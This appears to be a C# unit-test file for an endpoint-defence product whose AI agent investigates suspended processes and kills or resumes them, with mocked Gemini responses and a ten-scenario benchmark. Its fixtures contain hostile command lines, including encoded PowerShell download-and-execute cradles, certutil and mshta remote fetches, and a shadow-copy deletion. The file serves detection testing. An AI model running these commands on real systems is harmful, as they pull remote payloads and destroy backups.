using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.Agent.Gemini;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using ActionType = Phalanx.Shared.Protos.MitigationCommand.Types.ActionType;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

public class AutonomousHunterAgentTests
{
    private readonly ITestOutputHelper _output;

    public AutonomousHunterAgentTests(ITestOutputHelper output)
    {
        _output = output;
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestAutonomousInvestigationOnSuspendedProcess()
    {
        // 1. 컴포넌트 셋업 (명시적 null 주입으로 환경변수 영향 없는 오프라인 모드 격리)
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();

        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);

        // 2. 부모 프로세스(winword.exe) 및 동결된 자식 프로세스(powershell.exe) 트리에 적재
        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe 2026_09_invoice.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        // 3. 수사 명령 하달 모니터링
        var dispatchedCommands = new List<MitigationCommand>();

        // 4. AI 에이전트 ReAct 수사 실행
        var result = await agent.InvestigateAsync(
            targetNode,
            cmd =>
            {
                dispatchedCommands.Add(cmd);
                return Task.CompletedTask;
            }
        );

        // 5. 검증:
        // A) 오프라인 결정론적 모드에서는 불필요한 타임아웃 연장(ACTION_EXTEND_TIMEOUT) 없이 기본 10초 내 즉각 사살(ACTION_KILL) 1건만 하달 확인
        Assert.Single(dispatchedCommands);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, dispatchedCommands[0].Action);
        Assert.Equal((uint)8492, dispatchedCommands[0].TargetPid);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.DoesNotContain(dispatchedCommands, c => c.Action == MitigationCommand.Types.ActionType.ActionExtendTimeout);

        // C) 3초 이내 초고속 자율 수사 완료 검증 (< 3000ms)
        Assert.True(result.Elapsed.TotalSeconds < 3.0, $"수사 시간이 3초를 초과함: {result.Elapsed.TotalMilliseconds}ms");

        // D) 확신도 90% 이상 및 침해사고 한국어 공식 서사 검증
        Assert.True(result.Confidence >= 0.90, $"확신도 미달: {result.Confidence}");
        Assert.Contains("winword.exe", result.Narrative);
        Assert.Contains("powershell.exe", result.Narrative);
        Assert.Contains("185.220.101.5", result.Narrative);
        Assert.Contains("T1566.001", result.MitreTactics);

        // E) ReAct 단계별 추적 로그 검증 (Thought ➔ Action ➔ Observation)
        Assert.True(result.Traces.Count >= 3);
        Assert.Contains(result.Traces, t => t.ActionTool == "DecodePayloadTool");
        Assert.Contains(result.Traces, t => t.ActionTool == "ThreatReputationTool");
        Assert.Contains(result.Traces, t => t.ActionTool == "MitreClassifierTool");

        // F) LiteDB 포렌식 아카이브 영속화 및 역조회 검증
        var savedIncident = archiveManager.GetIncident(result.IncidentId);
        Assert.NotNull(savedIncident);
        Assert.Equal(result.IncidentId, savedIncident.IncidentId);
        Assert.Equal("ACTION_KILL", savedIncident.VerdictAction);

        var savedTraces = archiveManager.GetTracesForIncident(result.IncidentId);
        Assert.Equal(result.Traces.Count, savedTraces.Count);
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestGeminiLiveModeWithMockHttp()
    {
        // 1. 모의 Gemini REST 멀티턴 2단계 응답 구성
        // Turn 1: 1차 분석 및 DecodePayloadTool 도구 호출 요청
        string turn1DecisionJson = """
        {
          "thought": "오피스 매크로 winword.exe가 powershell.exe를 기동하여 난독화 인라인 다운로더를 실행하고 있으므로 DecodePayloadTool을 호출하여 C2 페이로드를 해독해야 합니다.",
          "action_tool": "DecodePayloadTool",
          "action_args": {},
          "is_final_verdict": false
        }
        """;

        string turn1GeminiResponseJson = $$"""
        {
          "candidates": [
            {
              "content": {
                "role": "model",
                "parts": [
                  {
                    "text": {{JsonSerializer.Serialize(turn1DecisionJson)}}
                  }
                ]
              },
              "finishReason": "STOP"
            }
          ]
        }
        """;

        // Turn 2: 도구 관찰 결과(Observation) 평가 후 사형(ACTION_KILL) 최종 판결
        string turn2DecisionJson = """
        {
          "thought": "DecodePayloadTool 관찰 결과, 난독화 해독된 스크립트에서 외부 악성 C2 IP(185.220.101.5) 통신이 확증되었습니다. 따라서 즉각 사살(ACTION_KILL)을 최종 판결합니다.",
          "action_tool": "None",
          "action_args": {},
          "is_final_verdict": true,
          "verdict_action": "ACTION_KILL",
          "confidence_score": 0.99,
          "summary_title": "Gemini AI: 파일리스 C2 다운로더 침투 실시간 탐지",
          "narrative": "Gemini AI 실시간 멀티턴 수사 결과, winword.exe에 의해 기동된 powershell.exe 프로세스가 악성 C2와 통신하려는 시도가 확증되었습니다. 즉각 사살(ACTION_KILL)을 집행합니다.",
          "mitre_tactics": ["T1566.001", "T1059.001"]
        }
        """;

        string turn2GeminiResponseJson = $$"""
        {
          "candidates": [
            {
              "content": {
                "role": "model",
                "parts": [
                  {
                    "text": {{JsonSerializer.Serialize(turn2DecisionJson)}}
                  }
                ]
              },
              "finishReason": "STOP"
            }
          ]
        }
        """;

        int callCount = 0;
        var mockHandler = new MockHttpMessageHandler(req =>
        {
            Assert.Contains("generativelanguage.googleapis.com", req.RequestUri?.Host);
            Assert.Contains("key=test-api-key", req.RequestUri?.Query);

            int currentCall = Interlocked.Increment(ref callCount);
            string responseBody = currentCall == 1 ? turn1GeminiResponseJson : turn2GeminiResponseJson;

            return new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(responseBody, Encoding.UTF8, "application/json")
            };
        });

        var mockHttpClient = new HttpClient(mockHandler);
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(
            treeManager,
            archiveManager,
            tools,
            geminiApiKey: "test-api-key",
            httpClient: mockHttpClient
        );

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        var dispatchedCommands = new List<MitigationCommand>();

        // 2. 실행 (진짜 멀티턴 ReAct 루프 동작)
        var result = await agent.InvestigateAsync(targetNode, cmd =>
        {
            dispatchedCommands.Add(cmd);
            return Task.CompletedTask;
        });

        // 3. 검증
        Assert.Equal(2, callCount); // 2턴 왕복 검증
        Assert.True(dispatchedCommands.Count >= 2);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionExtendTimeout, dispatchedCommands[0].Action);
        Assert.Equal((uint)8492, dispatchedCommands[0].TargetPid);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, dispatchedCommands[^1].Action);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.True(result.Confidence >= 0.95);
        Assert.Contains("Gemini AI", result.SummaryTitle);
        Assert.Contains("Gemini AI", result.Narrative);
        Assert.Contains("T1566.001", result.MitreTactics);

        // 멀티턴 Trace 검증 (최소 2개 이상의 Step: DecodePayloadTool 및 사형 판결/방화벽)
        Assert.True(result.Traces.Count >= 2);
        Assert.Contains(result.Traces, t => t.ActionTool == "DecodePayloadTool");

        // LiteDB 저장 확인
        var saved = archiveManager.GetIncident(result.IncidentId);
        Assert.NotNull(saved);
        Assert.Equal(result.IncidentId, saved.IncidentId);
    }

    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestGeminiFallbackToOfflineOnNetworkFailure()
    {
        // 네트워크 단절 시 예외를 던지는 모의 핸들러
        var failingHandler = new MockHttpMessageHandler(_ =>
        {
            throw new HttpRequestException("DNS Resolution Failure (Simulated offline network)");
        });

        var failingHttpClient = new HttpClient(failingHandler);
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // API Key는 지정되어 있으나 네트워크가 죽어있는 환경
        var agent = new AutonomousHunterAgent(
            treeManager,
            archiveManager,
            tools,
            geminiApiKey: "test-api-key",
            httpClient: failingHttpClient
        );

        string rawScript = "vssadmin delete shadows /all /quiet";
        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 9999,
            ParentProcessId = 0,
            ImageName = "vssadmin.exe",
            CommandLine = rawScript,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(9999);
        Assert.NotNull(targetNode);

        // 실행: 예외 없이 오프라인 엔진으로 즉각 폴백되어야 함
        var result = await agent.InvestigateAsync(targetNode);

        // 검증: 오프라인 결정론적 엔진에 의해 정상 사살 판결 도출 확인
        Assert.NotNull(result);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.True(result.Elapsed.TotalSeconds < 3.0);
    }

    [Fact]
    [Trait("Category", "Live")]
    public async Task TestLiveAutonomousInvestigationWithLocalCredentials()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // Phalanx 로컬 인증정보(Config/google-credentials.json 또는 AppSettings.json)로 실제 Vertex AI Gemini 클라이언트 자동 연결
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        var dispatchedCommands = new List<MitigationCommand>();

        // 실행: 실제 구글 클라우드로 요청을 보내서 실시간 추론 진행!
        var result = await agent.InvestigateAsync(targetNode, cmd =>
        {
            dispatchedCommands.Add(cmd);
            return Task.CompletedTask;
        });

        // 결과 검증
        Assert.NotNull(result);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.Contains(dispatchedCommands, c => c.Action == MitigationCommand.Types.ActionType.ActionExtendTimeout);
        Assert.False(string.IsNullOrWhiteSpace(result.Narrative));
        Assert.False(string.IsNullOrWhiteSpace(result.SummaryTitle));
        Assert.True(result.Traces.Count >= 2, $"멀티턴 단계 부족: {result.Traces.Count}");

        _output.WriteLine($"[LIVE VERDICT] {result.VerdictAction} (Confidence: {result.Confidence:P1})");
        _output.WriteLine($"[TITLE] {result.SummaryTitle}");
        _output.WriteLine($"[ELAPSED] {result.Elapsed.TotalMilliseconds:F1}ms");
        _output.WriteLine($"[NARRATIVE]\n{result.Narrative}");
        foreach (var trace in result.Traces)
        {
            _output.WriteLine($"[STEP {trace.StepNumber}] Tool: {trace.ActionTool} | Latency: {trace.ElapsedMs:F1}ms");
            _output.WriteLine($"  Thought: {trace.Thought}");
            _output.WriteLine($"  Args: {trace.ActionArgsJson}");
            _output.WriteLine($"  Observation: {trace.Observation}");
        }

        var auditPayload = new
        {
            IncidentId = result.IncidentId,
            TargetPid = targetNode.ProcessId,
            ParentPid = 3104,
            CommandLine = targetNode.CommandLine,
            TotalElapsedMs = result.Elapsed.TotalMilliseconds,
            Verdict = result.VerdictAction.ToString(),
            Confidence = result.Confidence,
            Title = result.SummaryTitle,
            Narrative = result.Narrative,
            MitreTactics = result.MitreTactics,
            RemediationSteps = result.RemediationSteps,
            Steps = result.Traces.Select(t => new
            {
                StepNumber = t.StepNumber,
                ElapsedMs = t.ElapsedMs,
                Tool = t.ActionTool,
                Thought = t.Thought,
                Args = t.ActionArgsJson,
                Observation = t.Observation,
                RawResponse = t.RawLlmResponse
            }).ToList()
        };

        string auditPath = Path.Combine(AppContext.BaseDirectory, "live_llm_context_audit.json");
        File.WriteAllText(auditPath, JsonSerializer.Serialize(auditPayload, new JsonSerializerOptions { WriteIndented = true }));
    }

    private class MockHttpMessageHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;

        public MockHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler)
        {
            _handler = handler;
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            return Task.FromResult(_handler(request));
        }
    }

    [Fact]
    [Trait("Category", "Unit")]
    public void TestLlmJsonParserWithNestedBracesInStringAndMarkdown()
    {
        // LLM이 마크다운 백틱, 앞뒤 잡담, 문자열 내부 중괄호 및 이스케이프를 출력한 극단적 엣지 케이스
        string rawLlmResponse = """
            네, 분석 결과 JSON을 제출합니다:
            ```json
            {
              "thought": "문자열 내부에 중괄호 { nested: true, key: \"value\" } 가 포함되어 있으며 이스케이프 \\\" 도 존재합니다.",
              "action_tool": "DecodePayloadTool",
              "action_args": {
                "encodedCommand": "test-command"
              },
              "is_final_verdict": false,
              "confidence_score": 0.95
            }
            ```
            추가 조사가 필요합니다.
            """;

        var decision = LlmJsonParser.DeserializeSafe<AiInvestigationDecision>(rawLlmResponse);

        Assert.NotNull(decision);
        Assert.Equal("DecodePayloadTool", decision.ActionTool);
        Assert.False(decision.IsFinalVerdict);
        Assert.Equal(0.95, decision.ConfidenceScore);
        Assert.Contains("{ nested: true", decision.Thought);
    }

    [Fact]
    [Trait("Category", "Live")]
    public async Task TestLive_MultiScenario_AverageTurnAndLatencyBenchmark()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);

        // 10대 실무 시나리오 구성 (악성 공격 6종 vs 정상 업무 4종)
        var scenarios = new (string Name, string ParentImage, uint ParentPid, string TargetImage, uint TargetPid, string CommandLine, ActionType ExpectedAction)[]
        {
            (
                "1. 파일리스 C2 인라인 다운로더 (Office Macro -> PowerShell)",
                "winword.exe", 3001,
                "powershell.exe", 3002,
                $"powershell.exe -NoProfile -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')"))}",
                ActionType.ActionKill
            ),
            (
                "2. LOLBAS CertUtil 악성 원격 다운로드 (Excel -> CertUtil)",
                "excel.exe", 3101,
                "certutil.exe", 3102,
                "certutil.exe -urlcache -split -f http://194.165.16.11/nc.exe C:\\Temp\\nc.exe",
                ActionType.ActionKill
            ),
            (
                "3. 이메일 첨부파일 반사형 C2 비콘 다운로드 (Outlook -> CMD -> PowerShell)",
                "outlook.exe", 3201,
                "cmd.exe", 3202,
                $"cmd.exe /c powershell.exe -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-WebRequest -Uri 'http://45.33.32.156/beacon.bin' -OutFile C:\\Temp\\beacon.bin"))}",
                ActionType.ActionKill
            ),
            (
                "4. 브라우저 드라이브바이 HTA 공격 (Edge -> MSHTA)",
                "msedge.exe", 3301,
                "mshta.exe", 3302,
                "mshta.exe http://193.142.59.183/exploit.hta",
                ActionType.ActionKill
            ),
            (
                "5. PDF 취약점 연계 WScript 2차 드로퍼 (Acrobat -> WScript)",
                "AcroRd32.exe", 3401,
                "wscript.exe", 3402,
                "wscript.exe C:\\Users\\Public\\drop.vbs http://103.145.13.22/stage2.exe",
                ActionType.ActionKill
            ),
            (
                "6. 랜섬웨어 볼륨 섀도 복사본 영구 삭제 (Excel -> CMD -> VSSAdmin)",
                "excel.exe", 3501,
                "cmd.exe", 3502,
                "cmd.exe /c vssadmin.exe delete shadows /all /quiet",
                ActionType.ActionKill
            ),
            (
                "7. 정상 관리자 백업 서비스 점검 스크립트 (Explorer -> PowerShell)",
                "explorer.exe", 3601,
                "powershell.exe", 3602,
                $"powershell.exe -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File -FilePath '\\\\internal-backup.corp.local\\status.log'"))}",
                ActionType.ActionResume
            ),
            (
                "8. 개발자 빌드 폴더 대용량 파일 정기 감사 (CMD -> PowerShell)",
                "cmd.exe", 3701,
                "powershell.exe", 3702,
                "powershell.exe -ExecutionPolicy Bypass -Command \"Get-ChildItem -Path C:\\Projects\\Build -Recurse | Where-Object Length -gt 100MB\"",
                ActionType.ActionResume
            ),
            (
                "9. 사내 루트 인증서 신뢰 체인 검증 (Explorer -> CertUtil)",
                "explorer.exe", 3801,
                "certutil.exe", 3802,
                "certutil.exe -verify -urlcache C:\\Certs\\corp_root_ca.cer",
                ActionType.ActionResume
            ),
            (
                "10. IT 시스템 자산 정보 수집 인벤토리 (Services -> PowerShell)",
                "services.exe", 3901,
                "powershell.exe", 3902,
                "powershell.exe -NoProfile -Command \"Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | Export-Csv -Path C:\\CorpLogs\\os_inventory.csv\"",
                ActionType.ActionResume
            )
        };

        var results = new List<(string Name, string Verdict, string Expected, bool IsMatch, double Confidence, int Turns, double ElapsedMs)>();
        var detailedResults = new List<object>();

        _output.WriteLine("=========================================================================================");
        _output.WriteLine("   PHALANX GEMINI 3.7 FLASH 멀티 시나리오 평균 턴 수 & 지연시간 실측 벤치마크 (Live 10 Scenarios)   ");
        _output.WriteLine("=========================================================================================");

        foreach (var sc in scenarios)
        {
            treeManager.ApplySnapshotBatch(new[]
            {
                new ProcessEvent
                {
                    ProcessId = sc.ParentPid,
                    ImageName = sc.ParentImage,
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                }
            });

            treeManager.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = sc.TargetPid,
                ParentProcessId = sc.ParentPid,
                ImageName = sc.TargetImage,
                CommandLine = sc.CommandLine,
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var targetNode = treeManager.FindActiveNodeByPid(sc.TargetPid);
            Assert.NotNull(targetNode);

            _output.WriteLine($"\n▶ [실측 시작] {sc.Name}");
            _output.WriteLine($"  - 부모 프로세스: {sc.ParentImage} (PID: {sc.ParentPid})");
            _output.WriteLine($"  - 타깃 프로세스: {sc.TargetImage} (PID: {sc.TargetPid})");
            _output.WriteLine($"  - 명령줄 인자  : {sc.CommandLine[..Math.Min(sc.CommandLine.Length, 80)]}...");

            var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);

            int turns = res.Traces.Count(t => t.ActionTool != "SystemFirewallTool");
            bool isMatch = res.VerdictAction == sc.ExpectedAction;
            results.Add((sc.Name, res.VerdictAction.ToString(), sc.ExpectedAction.ToString(), isMatch, res.Confidence, turns, res.Elapsed.TotalMilliseconds));

            detailedResults.Add(new
            {
                Name = sc.Name,
                Parent = sc.ParentImage,
                Target = sc.TargetImage,
                CommandLine = sc.CommandLine,
                Expected = sc.ExpectedAction.ToString(),
                Verdict = res.VerdictAction.ToString(),
                IsMatch = isMatch,
                Confidence = res.Confidence,
                Turns = turns,
                ElapsedMs = res.Elapsed.TotalMilliseconds,
                SummaryTitle = res.SummaryTitle,
                Narrative = res.Narrative,
                MitreTactics = res.MitreTactics,
                Steps = res.Traces.Select(t => new
                {
                    StepNumber = t.StepNumber,
                    ElapsedMs = t.ElapsedMs,
                    Tool = t.ActionTool,
                    Thought = t.Thought
                }).ToList()
            });

            _output.WriteLine($"  ✔ 판결: {res.VerdictAction} (기대값: {sc.ExpectedAction}, 일치여부: {(isMatch ? "MATCH" : "MISMATCH")}) | 확신도: {res.Confidence:P0} | 소요 턴: {turns}턴 | 시간: {res.Elapsed.TotalMilliseconds:F0}ms");
            _output.WriteLine($"  ✔ 사건 서사 요약: {res.SummaryTitle}");

            // 구글 클라우드 RPM 버퍼링 (1.5초)
            await Task.Delay(1500);
        }

        // 통계 집계
        double avgTurns = results.Average(r => r.Turns);
        double avgElapsed = results.Average(r => r.ElapsedMs);

        _output.WriteLine("\n=========================================================================================");
        _output.WriteLine("                               📊 벤치마크 10대 시나리오 종합 실측 결과                   ");
        _output.WriteLine("=========================================================================================");
        foreach (var r in results)
        {
            string status = r.IsMatch ? "PASS" : "FAIL";
            _output.WriteLine($" • [{status}] [{r.Verdict,-13}] (기대:{r.Expected,-13}) {r.Turns}턴 | {r.ElapsedMs,7:F0} ms | {r.Confidence,4:P0} | {r.Name}");
        }
        _output.WriteLine("-----------------------------------------------------------------------------------------");
        _output.WriteLine($" ⭐ 총 검증 시나리오 : {results.Count}건 (악성 6건 + 정상 4건)");
        _output.WriteLine($" ⭐ 판결 일치율(정확도): {results.Count(r => r.IsMatch)} / {results.Count} ({results.Count(r => r.IsMatch) / (double)results.Count:P0})");
        _output.WriteLine($" ⭐ 평균 소요 턴 수   : {avgTurns:F2} 턴 (최대 5턴 예산 대비 최적화율: {(1 - avgTurns / 5.0) * 100:F1}%)");
        _output.WriteLine($" ⭐ 평균 완결 시간     : {avgElapsed:F0} ms ({avgElapsed / 1000.0:F2} 초 / 50초 SLA 대비 충분한 마진)");
        _output.WriteLine("=========================================================================================\n");

        string dumpPath = Path.Combine(AppContext.BaseDirectory, "benchmark_10scenarios_result.json");
        File.WriteAllText(dumpPath, JsonSerializer.Serialize(detailedResults, new JsonSerializerOptions { WriteIndented = true }));

        Assert.Equal(results.Count, results.Count(r => r.IsMatch));
        Assert.True(avgTurns <= 5.0, $"평균 턴 수가 최대 한도(5턴)를 초과함: {avgTurns}");
        Assert.True(avgElapsed < 50000, $"평균 수사 시간이 50초 SLA를 초과함: {avgElapsed}ms");
    }

    /// <summary>
    /// [Phase 3.5 FSM 검증] 사내 정상 백업/관리 스크립트 인입 시 FSM 조기 탈출(< 5ms) 및 ACTION_RESUME 검증
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestOfflineFSM_BenignInternalScript_EarlyExitUnder5ms()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // 명시적 오프라인 모드 (geminiApiKey: string.Empty)
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 1000,
                ImageName = "explorer.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        string script = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File '\\\\backup.corp.local\\status.log'";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 2001,
            ParentProcessId = 1000,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(2001);
        Assert.NotNull(targetNode);

        // JIT 및 Regex 사전 컴파일 웜업 (테스트 러너 최초 실행 시의 콜드스타트 지연 배제)
        await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);

        var sw = Stopwatch.StartNew();
        var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
        sw.Stop();

        _output.WriteLine($"⚡ [FSM 조기 탈출 실측] 소요 시간: {sw.ElapsedMilliseconds}ms | 판결: {res.VerdictAction} | 제목: {res.SummaryTitle}");

        // 조기 탈출 검증: 1단계 디코딩 직후 탈출하므로 트레이스가 정확히 1건이어야 함
        Assert.Single(res.Traces);
        Assert.Equal("DecodePayloadTool", res.Traces[0].ActionTool);
        Assert.Equal(ActionType.ActionResume, res.VerdictAction);
        Assert.True(res.Confidence >= 0.95);
        Assert.Empty(res.BlockedIp ?? string.Empty);
        Assert.True(sw.ElapsedMilliseconds < 1000, $"조기 탈출 시간 초과: {sw.ElapsedMilliseconds}ms");
    }

    /// <summary>
    /// [Phase 3.5 FSM 검증] 오피스 매크로 C2 다운로더 인입 시 다차원 위험도 스코어링(> 80점) 및 사살 검증
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestOfflineFSM_MaliciousOfficeLOLBAS_CumulativeScoreKills()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);

        // 부모: winword.exe (+30)
        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 1000,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        // 인라인 C2 다운로더 (+35) 및 악성 IP 185.220.101.5 (+40) => 총 105점 (> 80점)
        string script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
        string fullCmd = $"powershell.exe -w hidden -enc {b64}";

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 2002,
            ParentProcessId = 1000,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(2002);
        Assert.NotNull(targetNode);

        var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);

        _output.WriteLine($"🛡️ [FSM 위험도 사살 실측] 판결: {res.VerdictAction} | 제목: {res.SummaryTitle} | 차단 IP: {res.BlockedIp}");

        Assert.Equal(ActionType.ActionKill, res.VerdictAction);
        Assert.Equal("185.220.101.5", res.BlockedIp);
        Assert.NotEmpty(res.Record.RemediationSteps);
        Assert.Contains("엔드포인트 네트워크 격리", res.Record.RemediationSteps);
    }

    /// <summary>
    /// [꼬아둔 복합 회피 공격 검증] 
    /// 미등록 외부 IP(위협점수 45점, 단독 사살 불가) + Temp 디렉터리 내 svchost.exe 위장(Masquerading) + 인라인 다운로더 복합 시나리오.
    /// 에이전트가 단독 IP 평판만으로 조기 종료하지 못하고 3턴 이상의 심층 수사를 전개하는지 및 도구 결합성을 실측 검증.
    /// </summary>
    [Fact]
    [Trait("Category", "Live")]
    public async Task TestLive_ConvolutedEvasiveAttack_MultiTurnAnalysis()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);

        // 부모: explorer.exe (정상 윈도우 셸)
        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 5001,
                ImageName = "explorer.exe",
